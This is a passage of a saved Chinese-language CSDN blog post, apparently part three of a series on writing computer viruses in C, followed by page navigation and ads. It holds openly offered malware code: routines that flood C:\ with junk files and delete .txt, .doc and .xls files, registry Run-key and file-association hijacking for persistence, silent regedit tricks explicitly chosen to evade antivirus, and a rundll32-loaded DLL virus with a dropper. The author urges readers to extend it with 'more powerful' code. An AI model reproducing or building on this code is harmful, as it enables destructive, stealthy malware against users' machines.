+for(i=0;i&lt;RUBBISH_NUM;i++)<BR>&nbsp;&nbsp;&nbsp;&nbsp; {<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int n;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; char s[30];<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; n=rand();<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sprintf(s,"C:\\DESTORY_感染_%d",n);<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if((output=fopen(s,"w"))!=NULL)<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+fprintf(output,"%ld%s",n*n,s);<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fclose(output);<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<BR>&nbsp;&nbsp;&nbsp;&nbsp; }<BR>}<BR>
+/*=====================================================================*/<BR>
+/*<BR>&nbsp;&nbsp; 函数：删除文件<BR>*/&nbsp;<BR>void remove_files()<BR>{<BR>
+&nbsp;&nbsp;&nbsp;&nbsp; long done;<BR>&nbsp;&nbsp;&nbsp;&nbsp; int i;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp; struct _finddata_t ffblk;<BR>&nbsp;&nbsp;&nbsp;&nbsp; 
+char *remove_files[3]={"*.txt","*.doc","*.xls"};<BR>&nbsp;&nbsp;&nbsp;&nbsp; 
+for(i=0;i&lt;3;i++)<BR>&nbsp;&nbsp;&nbsp;&nbsp; {<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+if(_findfirst(remove_files[i],&amp;ffblk)==-1) continue;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; while(!done)<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; remove(ffblk.name);<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; _findnext(done,&amp;ffblk);<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+_findclose(done);<BR>&nbsp;&nbsp;&nbsp;&nbsp; }<BR>}<BR>
+/*=====================================================================*/<BR>
+/*<BR>&nbsp;&nbsp; 主程序<BR>&nbsp;&nbsp; 使用DEV-CPP 32位C工程 
+实现.C程序脱离命令行界面，于后台执行<BR>*/&nbsp;<BR>int main(int argc,char **argv)<BR>{<BR>
+&nbsp;&nbsp;&nbsp;&nbsp; int contral=0;<BR>&nbsp;&nbsp;&nbsp;&nbsp; 
+if(argc&gt;1)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+if(strcmp(argv[1],"/s")==0)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+goto next1;<BR>&nbsp;&nbsp;&nbsp;&nbsp; autorun_explorer();<BR>
+&nbsp;&nbsp;&nbsp;&nbsp; spawnl(1,"c:\\windows\\system\\explorer.exe",NULL);<BR>
+&nbsp;&nbsp;&nbsp;&nbsp; next1:<BR>&nbsp;&nbsp;&nbsp;&nbsp; add_reg();<BR>
+&nbsp;&nbsp;&nbsp;&nbsp; copy_virus();<BR>&nbsp;&nbsp;&nbsp;&nbsp; 
+make_rubbish();<BR>&nbsp;&nbsp;&nbsp;&nbsp; /* remove_files(); */<BR>
+&nbsp;&nbsp;&nbsp;&nbsp; spawnl(1,"c:\\windows\\system32\\mstsc32.exe"," 
+/s",NULL);<BR>&nbsp;&nbsp;&nbsp;&nbsp; return 0;<BR>}</P>
+<P 
+style="text-align: left; line-height: 24px; font-size: 16px;">这是第三篇连载了，这次着重写些编程技术和病毒原理方面问题。<BR>
+注册表篇<BR>1.可以用于病毒开机自启动的注册表位置：<BR>[HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]<BR>
+[HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices]<BR>
+[HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce]<BR>
+[HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServicesOnce]<BR>
+[HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]<BR>
+[HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce]<BR>
+[HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices]<BR>以上只是默认运行的部分注册表位置，其实还可以在系统启动外客(shell 
+explorer.exe)后添加病毒路径等方法，同样可以实现通过注册表开机自动运行。<BR>2.关联文件类型<BR>
+在注册表HKEY_CLASS_ROOT下可以更改文件类型的默认启动程序，比如更改EXE文件的启动程序为你写的病毒，那么每当运行exe程序时，病毒将替代程序运行<BR>
+例：<BR>
+到注册表HKEY_CLASS_ROOT\exefile\shell\open\command下，修改“默认”修改为c:\windows\svchost.exe 
+"%1" %*，那么以后运行.exe文件时只会运行c:\windows\svchost.exe</P>
+<P 
+style="text-align: left; line-height: 24px; font-size: 16px;">3.程序修改注册表的方法：<BR>(1)使用REG命令添加修改注册表：<BR>REG命令使用方法具体可以在命令提示符中输入REG 
+/?和通过参阅Windows命令帮助查看<BR>主要格式：<BR>REG Operation [Parameter List]</P>
+<P style="text-align: left; line-height: 24px; font-size: 16px;">&nbsp;&nbsp; 
+Operation&nbsp;&nbsp; [ QUERY&nbsp;&nbsp; | ADD&nbsp;&nbsp;&nbsp;&nbsp; | 
+DELETE&nbsp;&nbsp; | COPY&nbsp;&nbsp;&nbsp;&nbsp; |<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+SAVE&nbsp;&nbsp;&nbsp;&nbsp; | LOAD&nbsp;&nbsp; | UNLOAD&nbsp;&nbsp; | RESTORE 
+|<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+COMPARE | EXPORT | IMPORT 
+]<BR>例：向HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run中添加名为SVCHOST的键值，键值内容为C:\Windows\system\SVCHOST.exe</P>
+<P style="text-align: left; line-height: 24px; font-size: 16px;">reg add 
+"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v SVCHOST /d 
+C:\Windows\system\SVCHOST.exe /f</P>
+<P 
+style="text-align: left; line-height: 24px; font-size: 16px;">调用reg命令的方法主要有两中，一种是使用C语言中的system函数，另一种是使用C语言中的spawn类函数（如函数spawnl）。具体system和spawnl使用方法请参见其它资料,这里仅举一例：</P>
+<P 
+style="text-align: left; line-height: 24px; font-size: 16px;">例：用system函数通过reg命令向HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run中添加名为SVCHOST的键值，键值内容为C:\Windows\system\SVCHOST.exe</P>
+<P style="text-align: left; line-height: 24px; font-size: 16px;">system("reg add 
+\"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v SVCHOST /d 
+C:\\Windows\\system\\SVCHOST.exe /f");</P>
+<P 
+style="text-align: left; line-height: 24px; font-size: 16px;">评论与小结：使用REG命令添加注册表可以达到直接调用系统命令（工具）来修改注册表的目的，如果被杀毒软件拦截也只会显示修改操作的发出来自 
+C:\WINDOWS\system32\reg.exe，使病毒不容易被寻找到。但由于REG命令属于控制台命令，因此调用时有黑色的控制台出现，是病 
+毒的征兆被感染用户发现，不利于病毒隐藏。</P>
+<P 
+style="text-align: left; line-height: 24px; font-size: 16px;">(2)使用WindowsAPI添加修改注册表<BR>WindowsAPI为我们提供了大约25个函数。他提供了对注册表的读取，写入，删除，以及打开注册表及键值时所有函数这些函数有：&nbsp;<BR>RegCloseKey<BR>
+RegConnectRegistry<BR>RegCreateKey<BR>RegCreateKeyEx<BR>RegDeleteKey<BR>
+RegDeleteVale&nbsp;&nbsp;&nbsp;<BR>RegEnumKey<BR>RegFlushKey<BR>
+RegGetKeySecurity(Windows9X不适用)<BR>RegLoadKey&nbsp;<BR>
+RegNotifyChangeKeyValue(Windows9X不适用)<BR>RegOpenKey<BR>RegOpenKeyEx<BR>
+RegQueryInfoKey<BR>RegQueryValue&nbsp;<BR>RegQueryValueEx<BR>RegReplaceKey<BR>
+RegRestoreKey(Windows9X不适用)<BR>RegSaveKey<BR>
+RegSetKeySecurity(Windows9X不适用)<BR>RegSetValue<BR>RegSetValueEx<BR>
+RegUnLoadKey&nbsp;<BR>等，函数的使用需要在32位C编译器下调用windows.h文件，同(1)中一样，具体函数的使用方法请参见其它资料,这里仅举一例.<BR>例:通过WindowsAPI向HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run中添加名为SVCHOST的键值，键值内容为C:\Windows\system\SVCHOST.exe</P>
+<P style="text-align: left; line-height: 24px; font-size: 16px;">TRegistry* 
+Registry;&nbsp;<BR>Registry=new TRegistry();<BR>
+Registry-&gt;RootKey=HKEY_LOCAL_MACHINE;<BR>
+Registry-&gt;OpenKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",FALSE);<BR>
+Registry-&gt;WriteString("SVCHOST","C:\\Windows\\system\\SVCHOST.exe");WriteString()<BR>
+Registry-&gt;CloseKey();</P>
+<P 
+style="text-align: left; line-height: 24px; font-size: 16px;">评论与小结：使用WindowsAPI添加注册表可以达到直接无须调用系统命令（工具）就可以修改注册表的目的，但如果被杀毒软件拦截会显示修改操 
+作来自的病毒体文件所在的路径，使病毒容易被寻找到。但由于WindowsAPI可以“悄悄”的完成修改，在前台没有任何显示，因此调用时如果未被拦截， 
+很难被感染用户发觉，利于病毒隐藏。<BR>(3)使用REGEDIT添加修改注册表<BR>REGEDIT就是注册表编辑器，但它其实有一个/s的参数，只要调用regedit 
+/s 注册表文件，就可以在后台无提示的修改注册表。同样需要用spawnl函数调用它。</P>
+<P 
+style="text-align: left; line-height: 24px; font-size: 16px;">例：通过spawnl函数调用regedit向HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run中添加名为wjview32的键值，键值内容为C:\windows\wjview32.com 
+/s<BR>char 
+*regadd={"REGEDIT4\n\n[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run]\n\"wjview32\"=\"C:\\\\windows\\\\wjview32.com 
+/s\""};<BR>FILE *output;<BR>if((output=fopen("$$$$$","w"))!=NULL)<BR>{<BR>
+&nbsp;&nbsp; fprintf(output,regadd);<BR>&nbsp;&nbsp; fclose(output);<BR>
+&nbsp;&nbsp; spawnl(1,"c:\\windows\\regedit.exe"," /s $$$$$",NULL);<BR>}<BR>评 
+论与小结：使用spawnl函数+REGEDIT可以兼得WindowsAPI和REG两种方法的优势，添加注册表如果被杀毒软件拦截会显示修改操作来自 
+c:\windows\regedit.exe，使病毒的路径难以被寻找到，利于病毒的隐藏。REGEDIT可以“悄悄”的完成修改，在前台没有任何显 
+示，因此调用时如果未被拦截，很难被感染用户发觉，利于病毒隐藏。</P>
+<P 
+style="text-align: left; line-height: 24px; font-size: 16px;">首先说明一下,有些网友提出前3篇文章大都在讲注册表,没有新内容,但我认为:现在病毒几乎100%修改注册表,</P>
+<P 
+style="text-align: left; line-height: 24px; font-size: 16px;">因而(1)(2)的两个病毒示例也应做到如此,并且(1)(2)中分别用了不同的修改方法,用了不少不同的病毒技术.</P>
+<P 
+style="text-align: left; line-height: 24px; font-size: 16px;">而(3)是(1)(2)中部分技术的总结与技术方法的详细介绍,并又介绍了一些其它的注册表操作,再者,90%的病毒</P>
+<P 
+style="text-align: left; line-height: 24px; font-size: 16px;">必须通过注册表自启动,因此修改注册表可以是每个"真"病毒必须做的事.<BR><BR>本连载文章只讨论写病毒的技术,并不讨论危害计算机及网络,所示例的程序只是一个无危害的模板,你可以在技术范围及法律范围内扩充实验.</P>
+<P 
+style="text-align: left; line-height: 24px; font-size: 16px;">在读本程序前请保证不用此程序进行违法活动,由于你使用本程序而对他人、组织等造成的任何损失都由将你承担，本人不负任何责任，否则,请马上离开.</P>
+<P 
+style="text-align: left; line-height: 24px; font-size: 16px;">拒绝任何形式的转载（本人除外），否则属于著作侵权，将受到《中华人民共和国软件保护条理》、《中华人民共和国著作权法》、《中华人民共和国知识产权法》等法律最大限度的制裁！！</P>
+<P 
+style="text-align: left; line-height: 24px; font-size: 16px;">--------------------------------------------------------------------------------------------------<BR>这次讲一下DLL病毒:<BR>随着病毒的发展,病毒也由破坏的目的转为利益的目的,因此隐蔽的DLL病毒逐渐发展起来.DLL是Dynamic 
+Link</P>
+<P style="text-align: left; line-height: 24px; font-size: 16px;">Library 
+的缩写,中文为动态链接库,它的实质并不是一个程序,而是由多个功能函数构成的.而DLL病毒是通过</P>
+<P 
+style="text-align: left; line-height: 24px; font-size: 16px;">特别的方法,让系统文件Rundll.exe 
+\ Rundll32.exe等调用其的函数,而所调用的函数的代码就是病毒代码,或</P>
+<P 
+style="text-align: left; line-height: 24px; font-size: 16px;">者通过线程插入技术插入到系统进程explorer.exe 
+svchost.exe lsass.exe winlogon.exe 等或</P>
+<P 
+style="text-align: left; line-height: 24px; font-size: 16px;">iexplorer.exe等常用软件进程中,达到隐蔽的目的.<BR>DLL病毒的编写(rundll32.exe调用法)<BR>同建立一般的C工程一样,建立一个DLL 
+C工程,这时会有两个文件dll.h dllmain.c被建立,其中在dll.h中声明</P>
+<P 
+style="text-align: left; line-height: 24px; font-size: 16px;">函数,dllmain.c中编写函数,函数的内容就是病毒代码.<BR>最简单的DLL病毒例子:<BR>dllmain.c内容:</P>
+<P 
+style="text-align: left; line-height: 24px; font-size: 16px;">/*只要你有充足的知识积淀,可以无限的扩充,使其变的强悍<BR>
+具体扩充代码示例可以参照&lt;用C语言写病毒(2)&gt;*/<BR>/*在DEV-CPP 4.9.9.2 DLL C工程中编译测试通过*/<BR>
+#include "dll.h"<BR>#include &lt;stdio.h&gt;<BR>#include &lt;stdlib.h&gt;</P>
+<P style="text-align: left; line-height: 24px; font-size: 16px;">DLLIMPORT void 
+start ()<BR>{<BR>&nbsp;&nbsp; FILE *output;<BR>&nbsp;&nbsp; /*<BR>
+&nbsp;&nbsp;&nbsp;&nbsp; 
+注册[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\run]&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp; 
+这又是一个以前未与大家说的注册表位置，这个位置可以提前与explorer.exe执行，且一般的病毒用的不</P>
+<P 
+style="text-align: left; line-height: 24px; font-size: 16px;">多，十分隐蔽<BR>&nbsp;&nbsp; 
+*/&nbsp;<BR>&nbsp;&nbsp; if((output=fopen("$","w"))!=NULL)<BR>&nbsp;&nbsp; {<BR>
+&nbsp;&nbsp;&nbsp;&nbsp; fprintf(output,"REGEDIT4\n</P>
+<P 
+style="text-align: left; line-height: 24px; font-size: 16px;">[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer\\run]</P>
+<P 
+style="text-align: left; line-height: 24px; font-size: 16px;">\n\"Userinit\"=\"rundll32.exe 
+C:\\\\WINDOWS\\\\system32\\\\winsys.dll start ()\"");<BR>
+&nbsp;&nbsp;&nbsp;&nbsp; fclose(output);<BR>&nbsp;&nbsp;&nbsp;&nbsp; 
+spawnl(0,"c:\\windows\\regedit.exe"," /s $",NULL);<BR>&nbsp;&nbsp;&nbsp;&nbsp; 
+remove("$");<BR>&nbsp;&nbsp; }<BR>}<BR>dll.h内容:<BR>/*在DEV-CPP 4.9.9.2 DLL 
+C工程中编译测试通过*/<BR>#ifndef _DLL_H_<BR>#define _DLL_H_</P>
+<P style="text-align: left; line-height: 24px; font-size: 16px;">#if 
+BUILDING_DLL<BR># define DLLIMPORT __declspec (dllexport)<BR>#else<BR># define 
+DLLIMPORT __declspec (dllimport)<BR>#endif</P>
+<P style="text-align: left; line-height: 24px; font-size: 16px;">DLLIMPORT void 
+start (void);</P>
+<P style="text-align: left; line-height: 24px; font-size: 16px;">#endif /* 
+_DLL_H_ */<BR>这个例子可以在explorer.exe运行前启动并再次自动写自动运行键值,前提是需要将该DLL文件写于</P>
+<P 
+style="text-align: left; line-height: 24px; font-size: 16px;">c:\windows\system32\winsys.dll,这就可以交给exe主病毒来做了,这就是要说的DLL病毒与EXE病毒联合,这样</P>
+<P 
+style="text-align: left; line-height: 24px; font-size: 16px;">可以加强病毒的攻击力度,它由主病毒体*.exe来释放dll病毒辅助体*.dll,达到dll与exe联合的作用.一般</P>
+<P 
+style="text-align: left; line-height: 24px; font-size: 16px;">的,dll用来设置注册表的自启动,以及病毒的复制,而exe用来破坏.当然,也有少部分DLL病毒孤军奋战,由于十</P>
+<P style="text-align: left; line-height: 24px; font-size: 16px;">分隐蔽,也常常十分好用</P>
+<P style="text-align: left; line-height: 24px; font-size: 16px;">释放病毒体示例:<BR>
+/*释放上面的简单dll病毒体的例子的exe*/<BR>#include&lt;stdio.h&gt;<BR>unsigned char DLL[15161] 
+= {<BR><SPAN 
+style="color: rgb(255, 0, 51);">...此处代码过长,略...&nbsp;</SPAN>};<BR>int 
+main(void)<BR>{<BR>&nbsp;&nbsp;&nbsp;&nbsp; FILE *output;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp; int i;<BR>&nbsp;&nbsp;&nbsp;&nbsp; 
+output=fopen("C:\\WINDOWS\\system32\\winsys.dll","wb");<BR>
+&nbsp;&nbsp;&nbsp;&nbsp; fwrite(DLL,sizeof(DLL),1,output);<BR>
+&nbsp;&nbsp;&nbsp;&nbsp; fclose(output);<BR>&nbsp;&nbsp;&nbsp;&nbsp; 
+spawnl(1,"c:\\windows\\system32\\rundll32.exe"," 
+C:\\WINDOWS\\system32\\winsys.dll start</P>
+<P style="text-align: left; line-height: 24px; font-size: 16px;">()",NULL);<BR>
+&nbsp;&nbsp;&nbsp;&nbsp; return 0;<BR>}</P>
+<P 
+style="text-align: left; line-height: 24px; font-size: 16px;">好了,抛砖引玉,将代码增加,更改,换做你写的更厉害的代码...</P></DIV><!-- Baidu Button BEGIN --> 
+<DIV class="bdshare_t bds_tools get-codes-bdshare" id="bdshare" style="float: right;"><A 
+class="bds_qzone"></A> <A class="bds_tsina"></A> <A class="bds_tqq"></A> <A 
+class="bds_renren"></A> <A class="bds_t163"></A> <SPAN 
+class="bds_more">更多</SPAN> <A class="shareCount"></A> </DIV><!-- Baidu Button END --> <!--192.168.100.34--> 
+<UL class="article_next_prev">
+  <LI class="prev_article"><SPAN onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_shangyipian']);location.href='/ghevinn/article/details/8512804';">上一篇</SPAN><A 
+  onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_shangyipian'])" 
+  href="http://blog.csdn.net/ghevinn/article/details/8512804">SQLLite数据操作</A></LI>
+  <LI class="next_article"><SPAN onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_xiayipian']);location.href='/ghevinn/article/details/8517255';">下一篇</SPAN><A 
+  onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_xiayipian'])" 
+  href="http://blog.csdn.net/ghevinn/article/details/8517255">Delphi简介</A></LI></UL><!-- Baidu Button BEGIN --> 
+<SCRIPT id="bdshare_js" type="text/javascript" data="type=tools&amp;uid=1536434"></SCRIPT>
+ 
+<SCRIPT id="bdshell_js" type="text/javascript"></SCRIPT>
+ 
+<SCRIPT type="text/javascript">
+    document.getElementById("bdshell_js").src = "http://bdimg.share.baidu.com/static/js/shell_v2.js?cdnversion=" + Math.ceil(new Date()/3600000)
+</SCRIPT>
+ <!-- Baidu Button END -->         
+<DIV id="digg" articleid="8514900">
+<DL class="digg digg_disable" id="btnDigg">
+  <DT onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_ding'])">顶</DT>
+  <DD>4</DD></DL>
+<DL class="digg digg_disable" id="btnBury">
+  <DT onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_cai'])">踩</DT>
+  <DD>0</DD></DL></DIV></DIV>
+<DL class="blog-associat-tag">
+  <DT>主题推荐</DT>
+  <DD><A class="blog-tage-red" href="http://www.csdn.net/tag/病毒" 
+  target="_blank">病毒</A><A class="blog-tage-red" href="http://www.csdn.net/tag/c++" 
+  target="_blank">c++</A><A class="blog-tage-red" href="http://www.csdn.net/tag/杀毒软件" 
+  target="_blank">杀毒软件</A><A class="blog-tage-red" href="http://www.csdn.net/tag/知识产权" 
+  target="_blank">知识产权</A><A class="blog-tage-red" href="http://www.csdn.net/tag/计算机" 
+  target="_blank">计算机</A></DD></DL>
+<DL class="blog-ass-articl tracking-ad" id="res-relatived" data-mod="popu_36">
+  <DT><SPAN>猜你在找</SPAN></DT></DL>
+<SCRIPT type="text/javascript">
+    var searchtitletags = 'c++编写病毒入门' + ',' + '病毒,c++,杀毒软件,知识产权,计算机';
+    searchService({
+        index: 'blog',
+        query: searchtitletags,
+        from: 10,
+        size: 10,
+        appendTo: '#res-relatived',
+        url: 'recommend',
+        his: 2,
+        client: "blog_cf_enhance",
+        tmpl: '<dd style="background:url(http://static.blog.csdn.net/skin/default/images/blog-dot-red3.gif) no-repeat 0 10px;"><a href="#{ url }" title="#{ title }" strategy="#{ strategy }">#{ title }</a></dd>'
+    });
+
+ </SCRIPT>
+       
+<DIV id="ad_cen">
+<SCRIPT type="text/javascript">            BAIDU_CLB_SLOT_ID = "117306";</SCRIPT>
+         
+<SCRIPT src="c++编写病毒入门%20-%20ghevinn欢迎您光临%20-%20博客频道%20-%20CSDN_NET_files/o.js" type="text/javascript"></SCRIPT>
+     </DIV>
+<SCRIPT type="text/javascript">
+        //new Ad(4, 'ad_cen');
+    </SCRIPT>
+ 
+<DIV class="panel_head" id="comment_title">查看评论<A name="comments"></A></DIV>
+<DIV id="comment_list"></DIV>
+<DIV id="comment_bar"></DIV>
+<DIV id="comment_form"></DIV>
+<DIV class="announce">* 以上用户言论只代表其个人观点，不代表CSDN网站的观点或立场<A name="reply"></A><A 
+name="quote"></A></DIV>
+<SCRIPT type="text/javascript">
+    var fileName = '8514900';
+    var commentscount = 4;
+    var islock = false
+</SCRIPT>
+ 
+<SCRIPT src="c++编写病毒入门%20-%20ghevinn欢迎您光临%20-%20博客频道%20-%20CSDN_NET_files/comment.js" type="text/javascript"></SCRIPT>
+     
+<DIV id="ad_bot"></DIV>
+<SCRIPT type="text/javascript">
+    new Ad(5, 'ad_bot');
+    </SCRIPT>
+ 
+<DIV id="report_dialog"></DIV>
+<DIV id="d-top" style="bottom: 60px;"><A title="快速回复" class="btn btn-top q-reply" 
+id="quick-reply" style="display: none;"><IMG alt="快速回复" src="c++编写病毒入门%20-%20ghevinn欢迎您光临%20-%20博客频道%20-%20CSDN_NET_files/blog-icon-reply.png"> 
+        </A>        <A title="返回顶部" class="btn btn-top backtop" id="d-top-a" 
+style="display: none;" onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_huidaodingbu'])"><IMG 
+alt="TOP" src="c++编写病毒入门%20-%20ghevinn欢迎您光临%20-%20博客频道%20-%20CSDN_NET_files/top.png"> 
+    </A> </DIV>
+<SCRIPT type="text/javascript">
+    $(function ()
+    {
+        if($("#comment_content").length>0)
+        {
+            $("#quick-reply").show();
+
+            $("#quick-reply").click(function(){
+                setEditorFocus();
+            });
+        }       
+     
+        var d_top = $('#d-top-a');
+        document.onscroll = function ()
+        {
+            var scrTop = (document.body.scrollTop || document.documentElement.scrollTop);
+            if (scrTop > 500)
+            {
+                d_top.show();
+            } else
+            {
+                d_top.hide();
+            }
+        }
+        $('#d-top-a').click(function ()
+        {
+            scrollTo(0, 0);
+            this.blur();
+            return false;
+        });
+    });
+  
+</SCRIPT>
+ 
+<STYLE type="text/css">
+    .tag_list
+    {
+        background: none repeat scroll 0 0 #FFFFFF;
+        border: 1px solid #D7CBC1;
+        color: #000000;
+        font-size: 12px;
+        line-height: 20px;
+        list-style: none outside none;
+        margin: 10px 2% 0 1%;
+        padding: 1px;
+    }
+    .tag_list h5
+    {
+        background: none repeat scroll 0 0 #E0DBD3;
+        color: #47381C;
+        font-size: 12px;
+        height: 24px;
+        line-height: 24px;
+        padding: 0 5px;
+        margin: 0;
+    }
+    .tag_list h5 a
+    {
+        color: #47381C;
+    }
+    .classify
+    {
+        margin: 10px 0;
+        padding: 4px 12px 8px;
+    }
+    .classify a
+    {
+        margin-right: 20px;
+        white-space: nowrap;
+    }
+</STYLE>
+ 
+<DIV class="tag_list">
+<H5><A href="http://www.csdn.net/tag/" target="_blank">核心技术类目</A></H5>
+<DIV class="classify"><A title="全部主题" onclick="LogClickCount(this,336);" href="http://www.csdn.net/tag" 
+target="_blank">全部主题</A> <A title="Java" onclick="LogClickCount(this,336);" 
+href="http://www.csdn.net/tag/Java" target="_blank">Java</A> <A title="VPN" 
+onclick="LogClickCount(this,336);" href="http://www.csdn.net/tag/vpn" target="_blank">VPN</A> 
+<A title="Android" onclick="LogClickCount(this,336);" href="http://www.csdn.net/tag/android" 
+target="_blank">Android</A> <A title="iOS" onclick="LogClickCount(this,336);" 
+href="http://www.csdn.net/tag/ios" target="_blank">iOS</A> <A title="ERP" 
+onclick="LogClickCount(this,336);" href="http://www.csdn.net/tag/erp" target="_blank">ERP</A> 
+<A title="IE10" onclick="LogClickCount(this,336);" href="http://www.csdn.net/tag/ie10" 
+target="_blank">IE10</A> <A title="Eclipse" onclick="LogClickCount(this,336);" 
+href="http://www.csdn.net/tag/eclipse" target="_blank">Eclipse</A> <A title="CRM" 
+onclick="LogClickCount(this,336);" href="http://www.csdn.net/tag/crm" target="_blank">CRM</A> 
+<A title="JavaScript" onclick="LogClickCount(this,336);" href="http://www.csdn.net/tag/javascript" 
+target="_blank">JavaScript</A> <A title="Ubuntu" onclick="LogClickCount(this,336);" 
+href="http://www.csdn.net/tag/ubuntu" target="_blank">Ubuntu</A> <A title="NFC" 
+onclick="LogClickCount(this,336);" href="http://www.csdn.net/tag/nfc" target="_blank">NFC</A> 
+<A title="WAP" onclick="LogClickCount(this,336);" href="http://www.csdn.net/tag/wap" 
+target="_blank">WAP</A> <A title="jQuery" onclick="LogClickCount(this,336);" 
+href="http://www.csdn.net/tag/jquery" target="_blank">jQuery</A> <A title="数据库" 
+onclick="LogClickCount(this,336);" href="http://www.csdn.net/tag/数据库" target="_blank">数据库</A> 
+<A title="BI" onclick="LogClickCount(this,336);" href="http://www.csdn.net/tag/bi" 
+target="_blank">BI</A> <A title="HTML5" onclick="LogClickCount(this,336);" href="http://www.csdn.net/tag/html5" 
+target="_blank">HTML5</A> <A title="Spring" onclick="LogClickCount(this,336);" 
+href="http://www.csdn.net/tag/spring" target="_blank">Spring</A> <A title="Apache" 
+onclick="LogClickCount(this,336);" href="http://www.csdn.net/tag/apache" target="_blank">Apache</A> 
+<A title="Hadoop" onclick="LogClickCount(this,336);" href="http://www.csdn.net/tag/hadoop" 
+target="_blank">Hadoop</A> <A title=".NET" onclick="LogClickCount(this,336);" 
+href="http://www.csdn.net/tag/.net" target="_blank">.NET</A> <A title="API" 
+onclick="LogClickCount(this,336);" href="http://www.csdn.net/tag/api" target="_blank">API</A> 
+<A title="HTML" onclick="LogClickCount(this,336);" href="http://www.csdn.net/tag/html" 
+target="_blank">HTML</A> <A title="SDK" onclick="LogClickCount(this,336);" href="http://www.csdn.net/tag/sdk" 
+target="_blank">SDK</A> <A title="IIS" onclick="LogClickCount(this,336);" href="http://www.csdn.net/tag/iis" 
+target="_blank">IIS</A> <A title="Fedora" onclick="LogClickCount(this,336);" 
+href="http://www.csdn.net/tag/fedora" target="_blank">Fedora</A> <A title="XML" 
+onclick="LogClickCount(this,336);" href="http://www.csdn.net/tag/xml" target="_blank">XML</A> 
+<A title="LBS" onclick="LogClickCount(this,336);" href="http://www.csdn.net/tag/lbs" 
+target="_blank">LBS</A> <A title="Unity" onclick="LogClickCount(this,336);" 
+href="http://www.csdn.net/tag/unity" target="_blank">Unity</A> <A title="Splashtop" 
+onclick="LogClickCount(this,336);" href="http://www.csdn.net/tag/splashtop" 
+target="_blank">Splashtop</A> <A title="UML" onclick="LogClickCount(this,336);" 
+href="http://www.csdn.net/tag/uml" target="_blank">UML</A> <A title="components" 
+onclick="LogClickCount(this,336);" href="http://www.csdn.net/tag/components" 
+target="_blank">components</A> <A title="Windows Mobile" onclick="LogClickCount(this,336);" 
+href="http://www.csdn.net/tag/windowsmobile" target="_blank">Windows Mobile</A> 
+<A title="Rails" onclick="LogClickCount(this,336);" href="http://www.csdn.net/tag/rails" 
+target="_blank">Rails</A> <A title="QEMU" onclick="LogClickCount(this,336);" 
+href="http://www.csdn.net/tag/qemu" target="_blank">QEMU</A> <A title="KDE" 
+onclick="LogClickCount(this,336);" href="http://www.csdn.net/tag/kde" target="_blank">KDE</A> 
+<A title="Cassandra" onclick="LogClickCount(this,336);" href="http://www.csdn.net/tag/cassandra" 
+target="_blank">Cassandra</A> <A title="CloudStack" onclick="LogClickCount(this,336);" 
+href="http://www.csdn.net/tag/cloudstack" target="_blank">CloudStack</A> <A 
+title="FTC" onclick="LogClickCount(this,336);" href="http://www.csdn.net/tag/ftc" 
